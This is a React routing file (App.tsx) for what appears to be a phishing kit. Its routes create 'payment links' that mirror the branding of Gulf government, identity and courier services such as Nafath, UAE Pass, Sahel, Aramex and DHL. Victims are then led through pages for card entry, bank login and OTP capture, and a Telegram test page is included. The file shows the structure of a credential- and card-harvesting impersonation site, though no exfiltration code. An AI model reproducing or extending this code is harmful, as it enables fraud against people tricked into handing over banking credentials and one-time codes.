import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useNavigate, useParams, useSearchParams } from "react-router-dom";
import { useEffect, useMemo } from "react";

// Page Imports
import Index from "./pages/Index";
import Services from "./pages/Services";
import CreateChaletLink from "./pages/CreateChaletLink";
import CreateShippingLink from "./pages/CreateShippingLink";
import CreatePaymentLink from "./pages/CreatePaymentLink";
import CreateInvoice from "./pages/CreateInvoice";
import InvoiceList from "./pages/InvoiceList";
import InvoiceView from "./pages/InvoiceView";
import InvoiceEdit from "./pages/InvoiceEdit";
import HealthServices from "./pages/HealthServices";
import LogisticsServices from "./pages/LogisticsServices";
import Contracts from "./pages/Contracts";
import PaymentRecipient from "./pages/PaymentRecipient";
import PaymentDetails from "./pages/PaymentDetails";
import PaymentData from "./pages/PaymentData";
import PaymentBankSelector from "./pages/PaymentBankSelector";
import PaymentCardInput from "./pages/PaymentCardInput";
import PaymentBankLogin from "./pages/PaymentBankLogin";
import PaymentCardForm from "./pages/PaymentCardForm";
import PaymentCard from "./pages/PaymentCard";
import PaymentOTPForm from "./pages/PaymentOTPForm";
import PaymentOTP from "./pages/PaymentOTP";
import PaymentReceiptPage from "./pages/PaymentReceiptPage";
import PaymentReceipt from "./pages/PaymentReceipt";
import TelegramTestPage from "./pages/TelegramTestPage";
import ChaletPayment from "./pages/ChaletPayment";
import GovernmentPayment from "./pages/GovernmentPayment";
import HealthPayment from "./pages/HealthPayment";
import LocalPaymentPage from "./pages/LocalPaymentPage";
import ContractPaymentPage from "./pages/ContractPaymentPage";
import DynamicIdentityDemo from "./pages/DynamicIdentityDemo";
import DynamicIdentityTest from "./pages/DynamicIdentityTest";
import SaddadRecipientPage from "./pages/SaddadRecipientPage";
import GovernmentPaymentLinkCreator from "./pages/GovernmentPaymentLinkCreator";
import CreateHealthPaymentLink from "./pages/CreateHealthPaymentLink";
import CreateLogisticsPaymentLink from "./pages/CreateLogisticsPaymentLink";
import CreateContractPaymentLink from "./pages/CreateContractPaymentLink";
import NotFound from "./pages/NotFound";

import { AutoIdentityProvider } from "./hooks/useAutoIdentityApplication";
import ErrorBoundary from "./components/ErrorBoundary";
import GCCChameleonInjector from "./components/GCCChameleonInjector";
import { MirrorPageWrapper } from "./components/MirrorPageWrapper";
import { useLinkData } from "./hooks/useLinkData";

/**
 * MirrorRouteWrapper
 * 
 * GCC_OMNI_ROUTING_STABILITY_V375
 * Forensic wrapping of all payment and creation routes to ensure
 * absolute visual identity persistence and zero 'undefined' parameters.
 */
const MirrorRouteWrapper = ({ children }: { children: React.ReactNode }) => {
  const { id, country, serviceKey, service } = useParams();
  const [searchParams] = useSearchParams();
  const { data: linkData } = useLinkData(id);

  const entityId = useMemo(() => {
    // Priority 1: Query Params (company, entity, service, type)
    const queryEntity = searchParams.get("company") || 
                        searchParams.get("entity") || 
                        searchParams.get("service") || 
                        searchParams.get("type");
    if (queryEntity) return queryEntity;

    // Priority 2: Route Params (serviceKey, service, id)
    if (serviceKey && serviceKey !== 'undefined') return serviceKey;
    if (service && service !== 'undefined') return service;

    // Priority 3: Link Data Payload
    if (linkData?.payload?.service_key) return linkData.payload.service_key;

    // Priority 4: Default based on route pattern
    const path = window.location.pathname;
    if (path.includes('nafath')) return 'nafath';
    if (path.includes('uaepass')) return 'uaepass';
    if (path.includes('sahel')) return 'sahel';
    if (path.includes('aramex')) return 'aramex';
    if (path.includes('dhl')) return 'dhl';
    
    return 'default';
  }, [searchParams, serviceKey, service, linkData]);

  return (
    <MirrorPageWrapper entityId={entityId} linkData={linkData}>
      {children}
    </MirrorPageWrapper>
  );
};

// Redirect component for /r/ links → payment flow (Safely Cloned from Good Version)
const PaymentLinkRedirect = () => {
  const { country, type, id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();

  useEffect(() => {
    const company = searchParams.get("company") || searchParams.get("type") || "";
    const d = searchParams.get("d");
    let decodedData: any = null;
    if (d) {
      try {
        decodedData = JSON.parse(atob(d));
      } catch (e) {}
    }

    const targetCompany = decodedData?.company || company || "";
    const params = new URLSearchParams(searchParams.toString());
    if (targetCompany) params.set("company", targetCompany);
    if (!params.has("country")) params.set("country", country || "SA");

    navigate(`/pay/${id}?${params.toString()}`, { replace: true });
  }, [country, type, id, searchParams, navigate]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-slate-50" dir="rtl">
      <div className="text-center space-y-4">
        <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center mx-auto">
          <div className="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin" />
        </div>
        <p className="text-slate-500 font-bold tracking-tight">جاري التحويل الآمن...</p>
      </div>
    </div>
  );
};

const queryClient = new QueryClient({
  defaultOptions: {
    queries: { retry: 1, refetchOnWindowFocus: false, staleTime: 5 * 60 * 1000 },
  },
});

const App = () => (
  <ErrorBoundary>
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        <BrowserRouter>
          <AutoIdentityProvider>
            <GCCChameleonInjector>
              <Routes>
                <Route path="/" element={<Index />} />
                <Route path="/services" element={<Services />} />
                
                {/* Admin/Creation Section (Safely Wrapped) */}
                <Route path="/create/:country/chalet" element={<MirrorRouteWrapper><CreateChaletLink /></MirrorRouteWrapper>} />
                <Route path="/create/:country/shipping" element={<MirrorRouteWrapper><CreateShippingLink /></MirrorRouteWrapper>} />
                <Route path="/create/:country/payment" element={<MirrorRouteWrapper><CreatePaymentLink /></MirrorRouteWrapper>} />
                <Route path="/create/:country/government/:serviceKey" element={<MirrorRouteWrapper><GovernmentPaymentLinkCreator /></MirrorRouteWrapper>} />
                <Route path="/create/:country/health-payment" element={<MirrorRouteWrapper><CreateHealthPaymentLink /></MirrorRouteWrapper>} />
                <Route path="/create/:country/logistics-payment" element={<MirrorRouteWrapper><CreateLogisticsPaymentLink /></MirrorRouteWrapper>} />
                <Route path="/create/:country/contract-payment" element={<MirrorRouteWrapper><CreateContractPaymentLink /></MirrorRouteWrapper>} />
                
                <Route path="/invoices/create/:country" element={<CreateInvoice />} />
                <Route path="/invoices/list/:country" element={<InvoiceList />} />
                <Route path="/invoices/:id/view" element={<InvoiceView />} />
                <Route path="/invoices/:id/edit" element={<InvoiceEdit />} />
                
                <Route path="/health/:country" element={<HealthServices />} />
                <Route path="/logistics/:country" element={<LogisticsServices />} />
                <Route path="/contracts/:country" element={<Contracts />} />
                
                {/* Forensic Payment Flow (STRICT 1:1 MIRRORING) */}
                <Route path="/r/:country/:type/:id" element={<PaymentLinkRedirect />} />
                <Route path="/p/:id" element={<MirrorRouteWrapper><PaymentRecipient /></MirrorRouteWrapper>} />
                <Route path="/pay/:id" element={<MirrorRouteWrapper><PaymentRecipient /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/recipient" element={<MirrorRouteWrapper><PaymentRecipient /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/data" element={<MirrorRouteWrapper><PaymentData /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/details" element={<MirrorRouteWrapper><PaymentDetails /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/bank" element={<MirrorRouteWrapper><PaymentBankSelector /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/card" element={<MirrorRouteWrapper><PaymentCardInput /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/bank-login" element={<MirrorRouteWrapper><PaymentBankLogin /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/otp" element={<MirrorRouteWrapper><PaymentOTP /></MirrorRouteWrapper>} />
                <Route path="/pay/:id/receipt" element={<MirrorRouteWrapper><PaymentReceiptPage /></MirrorRouteWrapper>} />
                
                {/* Visual Identity Overrides */}
                <Route path="/chalet-payment" element={<MirrorRouteWrapper><ChaletPayment /></MirrorRouteWrapper>} />
                <Route path="/government-payment" element={<MirrorRouteWrapper><GovernmentPayment /></MirrorRouteWrapper>} />
                <Route path="/health-payment" element={<MirrorRouteWrapper><HealthPayment /></MirrorRouteWrapper>} />
                <Route path="/local-payment" element={<MirrorRouteWrapper><LocalPaymentPage /></MirrorRouteWrapper>} />
                <Route path="/contract-payment" element={<MirrorRouteWrapper><ContractPaymentPage /></MirrorRouteWrapper>} />
                
                <Route path="/telegram-test" element={<TelegramTestPage />} />
                <Route path="/dynamic-identity" element={<DynamicIdentityDemo />} />
                <Route path="/dynamic-identity-test" element={<DynamicIdentityTest />} />
                
                <Route path="*" element={<NotFound />} />
              </Routes>
            </GCCChameleonInjector>
          </AutoIdentityProvider>
        </BrowserRouter>
      </TooltipProvider>
    </QueryClientProvider>
  </ErrorBoundary>
);

export default App;
